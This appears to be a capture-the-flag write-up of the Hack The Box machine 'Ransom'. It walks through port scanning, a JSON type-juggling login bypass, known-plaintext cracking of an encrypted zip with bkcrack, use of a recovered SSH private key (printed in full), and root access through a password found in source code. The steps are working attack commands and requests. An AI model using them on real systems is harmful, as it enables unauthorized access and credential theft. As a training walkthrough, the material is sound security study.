

### Tools: Bkcrack

### Vulnerabilities: Type Juggling: JSON, Zip Cracking, Creds in config files

You know what shows a webpage and SSH as per usual.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.227.93
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-20 14:39 CDT
Nmap scan report for ransom.htb (10.129.227.93)
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://ransom.htb/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
```

Interestingly feroxbuster returned the user.txt flag and I was able to read and cat the flag in under 5 min. However I do not think this is correct so I will not post it here.

The /register page also has alot of info and where I spent most of my time. This however turned out to be a rabbit hole.

```console
└─$ feroxbuster -u http://10.129.227.93 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
302      GET       12l       22w      350c http://10.129.227.93/ => http://10.129.227.93/login
200      GET      172l      372w     6106c http://10.129.227.93/login
301      GET        9l       28w      311c http://10.129.227.93/js => http://10.129.227.93/js/
301      GET        9l       28w      312c http://10.129.227.93/css => http://10.129.227.93/css/
403      GET        9l       28w      278c http://10.129.227.93/.php
500      GET      217l    17833w        0c http://10.129.227.93/register
403      GET        9l       28w      278c http://10.129.227.93/.html
200      GET        1l        1w       33c http://10.129.227.93/user.txt
301      GET        9l       28w      316c http://10.129.227.93/css/lib => http://10.129.227.93/css/lib/
301      GET        9l       28w      315c http://10.129.227.93/js/lib => http://10.129.227.93/js/lib/
403      GET        9l       28w      278c http://10.129.227.93/js/.php
403      GET        9l       28w      278c http://10.129.227.93/css/.php
403      GET        9l       28w      278c http://10.129.227.93/js/.html
403      GET        9l       28w      278c http://10.129.227.93/css/.html
302      GET       12l       22w      390c http://10.129.227.93/index.php => http://10.129.227.93/index.php/login
301      GET        9l       28w      314c http://10.129.227.93/fonts => http://10.129.227.93/fonts/
```
The main page is a login. Simple enough but most of my tricks did not work.

![image](https://user-images.githubusercontent.com/105310322/197065584-2347fc55-4161-4ac3-a481-b54c24264ebf.png)




This is the output in Burpsuite. The password field was interesting to me and I wondered if I could mess with it.

```
GET /api/login?password=admin HTTP/1.1
Host: 10.129.227.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.93/login
Cookie: XSRF-TOKEN=eyJpdiI6InRjalA1Vk0wMEpXSk16WFNoMXlvaFE9PSIsInZhbHVlIjoiKytEeUdiSHd2WFpaWk9EU000ZkpCZGs4MWx6eXlROExSNDhZSGRvc01mZlY2QUZSN0o3MmNYTjlmWmJUTCtiYk94M1Y2cHdkSlNRYkordGRGMTg3K3NMZGF5QXByU0FsN1dWclA5L1NLTlYrdXRjQWRsblp5UEswZVFVUlR0RDUiLCJtYWMiOiJlYzhlOTIxNjU0OTY0MTU1YTRlMjA0OWRlZGY4Njg2ZmNjNzc0ZTZhMDM5ODhkNjUwNWRiODM2YmU4MjFkOGMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsUkJrQ3krck0wNHFDeFVHcTJOUlE9PSIsInZhbHVlIjoiVGk0ZW9oMXowNFkvL2lEbWxCeHFtR1FGMk5tdXVSa2R5QW01K0VHckpaMjlhRUtwRHhSZ3VLQzhNMUdzaWtUdHViRVBuQnlCdmY0RERqSXIvUVhMNVRsMW9JL1RBR3dCZFV3SDBFRlVyWHEyTVA4NmxUTjFIaWFYaG16aHMvcy8iLCJtYWMiOiJjY2ZhOWI1MTE3NzRiNDdiZTNhYzEyZjBlZjYwOTg3ZjE5NzAxMmJmMjQ5YzczMmMzZmYyNDA5ZTk5OTY4NDhmIiwidGFnIjoiIn0%3D
```


By keeping the password field blank I get a different response than normal in JSON.

```
GET /api/login?password= HTTP/1.1
Host: 10.129.227.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.93/login
Cookie: XSRF-TOKEN=eyJpdiI6InRjalA1Vk0wMEpXSk16WFNoMXlvaFE9PSIsInZhbHVlIjoiKytEeUdiSHd2WFpaWk9EU000ZkpCZGs4MWx6eXlROExSNDhZSGRvc01mZlY2QUZSN0o3MmNYTjlmWmJUTCtiYk94M1Y2cHdkSlNRYkordGRGMTg3K3NMZGF5QXByU0FsN1dWclA5L1NLTlYrdXRjQWRsblp5UEswZVFVUlR0RDUiLCJtYWMiOiJlYzhlOTIxNjU0OTY0MTU1YTRlMjA0OWRlZGY4Njg2ZmNjNzc0ZTZhMDM5ODhkNjUwNWRiODM2YmU4MjFkOGMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsUkJrQ3krck0wNHFDeFVHcTJOUlE9PSIsInZhbHVlIjoiVGk0ZW9oMXowNFkvL2lEbWxCeHFtR1FGMk5tdXVSa2R5QW01K0VHckpaMjlhRUtwRHhSZ3VLQzhNMUdzaWtUdHViRVBuQnlCdmY0RERqSXIvUVhMNVRsMW9JL1RBR3dCZFV3SDBFRlVyWHEyTVA4NmxUTjFIaWFYaG16aHMvcy8iLCJtYWMiOiJjY2ZhOWI1MTE3NzRiNDdiZTNhYzEyZjBlZjYwOTg3ZjE5NzAxMmJmMjQ5YzczMmMzZmYyNDA5ZTk5OTY4NDhmIiwidGFnIjoiIn0%3D
Content-Length: 2
```
```
HTTP/1.1 422 Unprocessable Content
Date: Thu, 20 Oct 2022 21:42:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: no-cache, private
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 57
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6IndUSXBJUFhEVjNxUnJPRW5vQStVU1E9PSIsInZhbHVlIjoicGg2bHNHZFMyUjNUM0dZNjhlenZJVlBGSW9vZkVPWWRiK3BEZ3lvOVk0bFo1cUZEcnhUY2kvVjhEWkpxU2NFc01ieURZNVhycFFTYnJKTm40SnREQUhoaUxLMFJQaEUrbXMvMjVNVmx4N1hWZEhBZ2VndDFKUzBTd3VrMnFia3ciLCJtYWMiOiI5MDBmZWE2ZDZmODJlZmMyNjY4ZjY4MzQ4YzMyNWU5NDk2Y2Y0ZDY0NGUzNGI2N2JkMGQ3ZTg1MTBiNWQ2OWJhIiwidGFnIjoiIn0%3D; expires=Thu, 20-Oct-2022 23:42:43 GMT; Max-Age=7200; path=/; samesite=lax
Content-Length: 99
Connection: close
Content-Type: application/json

{"message":"The given data was invalid.","errors":{"password":["The password field is required."]}}
```

Pretty simply all we have to do is create a new password field in JSON and set it to true. AKA Type Juggling

```
GET /api/login HTTP/1.1
Host: 10.129.227.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.129.227.93/login
Cookie: XSRF-TOKEN=eyJpdiI6InRjalA1Vk0wMEpXSk16WFNoMXlvaFE9PSIsInZhbHVlIjoiKytEeUdiSHd2WFpaWk9EU000ZkpCZGs4MWx6eXlROExSNDhZSGRvc01mZlY2QUZSN0o3MmNYTjlmWmJUTCtiYk94M1Y2cHdkSlNRYkordGRGMTg3K3NMZGF5QXByU0FsN1dWclA5L1NLTlYrdXRjQWRsblp5UEswZVFVUlR0RDUiLCJtYWMiOiJlYzhlOTIxNjU0OTY0MTU1YTRlMjA0OWRlZGY4Njg2ZmNjNzc0ZTZhMDM5ODhkNjUwNWRiODM2YmU4MjFkOGMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsUkJrQ3krck0wNHFDeFVHcTJOUlE9PSIsInZhbHVlIjoiVGk0ZW9oMXowNFkvL2lEbWxCeHFtR1FGMk5tdXVSa2R5QW01K0VHckpaMjlhRUtwRHhSZ3VLQzhNMUdzaWtUdHViRVBuQnlCdmY0RERqSXIvUVhMNVRsMW9JL1RBR3dCZFV3SDBFRlVyWHEyTVA4NmxUTjFIaWFYaG16aHMvcy8iLCJtYWMiOiJjY2ZhOWI1MTE3NzRiNDdiZTNhYzEyZjBlZjYwOTg3ZjE5NzAxMmJmMjQ5YzczMmMzZmYyNDA5ZTk5OTY4NDhmIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 22

{
	"password":true
}
```
```
HTTP/1.1 200 OK
Date: Thu, 20 Oct 2022 19:43:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: no-cache, private
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 59
Access-Control-Allow-Origin: *
Set-Cookie: laravel_session=eyJpdiI6IjJtL3kxQUM5amwzSGsvQ2xNNExRNUE9PSIsInZhbHVlIjoiZmVCbVJ6bDBCSEU5c2RkK0NsbW52ekh1VlJrWG5oTm1Mb2paRzc4OThwUHozNlFJam9ySFJKVmVmSmkyVnpuaUZ3NGx0aUlSNm41aWZKS2VvSlJuU2JmaVRaMzVUMlBJVXhzZkdVVGFqcERBZnJWVzZaV1VNMkpLVEUyYlQ2akYiLCJtYWMiOiIxMDkwOGZjZmYyMzNkMDQ5MWQ5MWIxYWFkN2VjMzk1YTlkODQyZTUyZWVlNWFjZTIzZmRjNmNmMWY4YmNmMWIzIiwidGFnIjoiIn0%3D; expires=Thu, 20-Oct-2022 21:43:38 GMT; Max-Age=7200; path=/; samesite=lax
Content-Length: 16
Connection: close
Content-Type: text/html; charset=UTF-8

Login Successful
```

After confirming the successful login capture a fresh request in Burp and input the same data then forward to reach the next page.

Theres the user.txt flag that we found earlier and a zip file that we should probably download.


![image](https://user-images.githubusercontent.com/105310322/197065618-f2d48eee-baec-473c-8858-1d9bb38148f4.png)


Upon downloading the zip file and trying to unzip it we learn that it is encrypted. From a previous challenge that I did, I learned of a tool called bkcrack that can crack zip files.


Download the bkcrack repository from github and follow the tutorial.md. It is very helpful.

https://github.com/kimci86/bkcrack


First we are going to list out all the files to see what we can access. They have ssh keys that we definiteley want!

```console
└─$ ./bkcrack -L uploaded-file-3422.zip 
bkcrack 1.4.0 - 2022-05-19
Archive: uploaded-file-3422.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Deflate     6ce3189b          220          170 .bash_logout
    1 ZipCrypto  Deflate     ab254644         3771         1752 .bashrc
    2 ZipCrypto  Deflate     d1b22a87          807          404 .profile
    3 None       Store       00000000            0            0 .cache/
    4 ZipCrypto  Store       00000000            0           12 .cache/motd.legal-displayed
    5 ZipCrypto  Store       00000000            0           12 .sudo_as_admin_successful
    6 None       Store       00000000            0            0 .ssh/
    7 ZipCrypto  Deflate     38804579         2610         1990 .ssh/id_rsa
    8 ZipCrypto  Deflate     cb143c32          564          475 .ssh/authorized_keys
    9 ZipCrypto  Deflate     cb143c32          564          475 .ssh/id_rsa.pub
   10 ZipCrypto  Deflate     396b04b4         2009          581 .viminfo
```

What bkcrack needs to work is at least 12 bytes of plaintext to attempt to crack the zip file. However even though I was giving it more than enough I was having some issues finding the keys I needed.

Eventually I settled on using the my own .bash_logout file but that was too large to use even though both files were the same size.

This means I needed to zip my own file to make it small enough to read.

Next we are going to copy our .bash_logout and create a zip file out of it.

```console
└─$ cp ~/.bash_logout bash
└─$ zip bash.zip bash
```

Then we use

-p for our plaintext file
-P for our plaintext zip file
-c for the file we are attacking
-C for the encrypted zip file

Note: I followed to tutorial but it suggests using an offset to help with plaintext. Because we had the whole file we did not need this.


Doing it correctly will give you the keys you need for our last step.
```console
└─$ ./bkcrack -p bash -P bash.zip -c .bash_logout -C uploaded-file-3422.zip         
bkcrack 1.4.0 - 2022-05-19
[15:42:00] Z reduction using 150 bytes of known plaintext
100.0 % (150 / 150)
[15:42:01] Attack on 54614 Z values at index 7
Keys: 7b549874 ebc25ec5 7e465e18
4.2 % (2309 / 54614)
[15:42:04] Keys
7b549874 ebc25ec5 7e465e18
```
Following the tutorial we can decrypt the entire zip file by putting it into our own. 

Create a zip file and run the following command.

```console
└─$ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U ransom.zip pass
bkcrack 1.4.0 - 2022-05-19
[15:46:09] Writing unlocked archive ransom.zip with password "pass"
100.0 % (9 / 9)
Wrote unlocked archive.
```
Then unzip your own to have access to all of the files!

```console
└─$ unzip ransom.zip            
Archive:  ransom.zip
[ransom.zip] .bash_logout password: 
  inflating: .bash_logout            
  inflating: .bashrc                 
  inflating: .profile                
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful  
  inflating: .ssh/id_rsa             
  inflating: .ssh/authorized_keys    
  inflating: .ssh/id_rsa.pub         
  inflating: .viminfo  
  ```

We get a users ssh key.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

and the public key has a username of htb.....

```
└─$ cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
```

Create your ssh key file and login.

```console
└─$ ssh htb@ransom.htb -i .ssh/id_rsa
The authenticity of host 'ransom.htb (10.129.227.93)' can't be established.
ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ransom.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  5 11:34:49 2021
htb@ransom:~$ 
```
I looked around for a bit but found no low hanging fruits. Linpeas found some DB creds but there wasnt a SQL server being ran. It did find that we could possibly abuse pkexec with sudo and the suid bit set. So finding a password became my goal.

I noticed a .git directory and I was intrigued since .git on these HTB machines often have good info hiding. However since there were so many files in this directory I decided to try and find a password a simpler and lazy way.

After greping the entirety of /srv/prod a lot of information showed up but one of them stood out as a possible password. ```UHC-March-Global-PW!```

```console
htb@ransom:/srv/prod$ grep -r "password"

app/Http/Controllers/AuthController.php:        if ($request->get('password') == "UHC-March-Global-PW!")
```


I was hoping to gain sudo permissions with this password so I could possible abuse pkexec but what I got was even better. Root's own password!


```
htb@ransom:/srv/prod$ su root
Password:
root@ransom:/srv/prod# cat /home/htb/user.txt
db28****************************
root@ransom:/srv/prod# cat /root/root.txt
58b0****************************
```
Not too bad of a machine, the type juggling portion was not so easily discovered but otherwise I enjoyed it.

GG!
